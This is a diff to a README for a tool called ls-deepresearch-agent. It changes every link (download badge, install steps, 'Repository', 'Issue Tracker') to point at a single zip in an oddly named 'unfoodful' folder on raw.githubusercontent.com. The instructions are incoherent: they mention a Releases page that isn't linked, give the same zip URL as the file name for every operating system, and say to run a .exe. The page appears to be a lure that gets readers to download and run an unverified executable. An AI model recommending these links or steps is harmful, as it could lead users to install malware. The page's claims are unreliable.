@@ -1,6 +1,6 @@
 # 🚀 ls-deepresearch-agent - Simplifying Data Research for Everyone
 
-[![Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
+[![Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip)](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip)
 
 ## 📖 Introduction
 
@@ -23,11 +23,11 @@ Here’s how to get started with ls-deepresearch-agent. This guide walks you thr
 ### 🔗 Download & Install
 
 1. **Visit this page to download**:
-   [Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
+   [Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip)
   
 2. Once on the Releases page, you will see a list of available versions. Choose the latest version for the best features and improvements.
 
-3. Look for the file that corresponds to your operating system. Files are typically named like `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip`, `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip`, or `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip`.
+3. Look for the file that corresponds to your operating system. Files are typically named like `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip`, `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip`, or `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip`.
 
 4. Click on the file to start downloading. Save it to your preferred location.
 
@@ -36,7 +36,7 @@ Here’s how to get started with ls-deepresearch-agent. This guide walks you thr
 6. **Run the application**:
    - **Windows:** Double-click the .exe file.
    - **macOS:** Open the .dmg file and drag the application to your Applications folder.
-   - **Linux:** Extract the https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip file and run the application from the terminal.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip file and run the application from the terminal.
 
 ### 🛠️ Using ls-deepresearch-agent
 
@@ -76,8 +76,8 @@ We welcome contributions! If you have ideas for improvements or features, please
 
 ## 🔗 Links
 
-- [Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
-- [Repository](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
+- [Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip)
+- [Repository](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/deepresearch-agent-ls-v2.3-alpha.1.zip)
 
 Enjoy using ls-deepresearch-agent for your research needs!
